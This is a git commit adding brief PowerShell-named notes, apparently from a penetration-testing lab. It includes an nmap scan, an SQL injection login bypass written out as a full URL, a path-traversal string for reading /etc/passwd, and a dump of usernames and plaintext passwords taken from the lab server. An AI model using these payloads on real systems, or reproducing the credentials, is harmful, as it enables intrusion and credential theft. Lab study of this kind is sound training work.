2338baa1d4b16d0be9c4a2447c5b308f36fd105b
PSeltzer <128486642+PSeltzer@users.noreply.github.com>
2023-06-07 13:41:37 -0400

    Create DRY_Ops.ps1

---
+++ Security/Seltzer/DRY_Ops.ps1
@@ -0,0 +1,24 @@
+####################################################################################################################################################################################################
+
+                                                                                         #DRY RUN#
+
+####################################################################################################################################################################################################
+
+#Will be given first IP
+    namp -v -sT -Pn <ip addr> -p-
+    
+#If 80 open go to ip addr in web browser to see if able to exploit
+    #Test different SQL injection or web exploits possible
+        tom' OR 1='1
+            #if works do version in the web bar
+                http://10.50.27.243/login.php?username=tom' OR 1='1&passwd=tom' OR 1='1
+        SSH key upload, etc
+        #if php with option can input /../../../../../../../../../../../../../../../../../../../../etc/passwd
+            #after equals sign to view /etc/passwd
+        
+
+Array of unames and passwds from http server of .243
+Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf )
+1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+
+
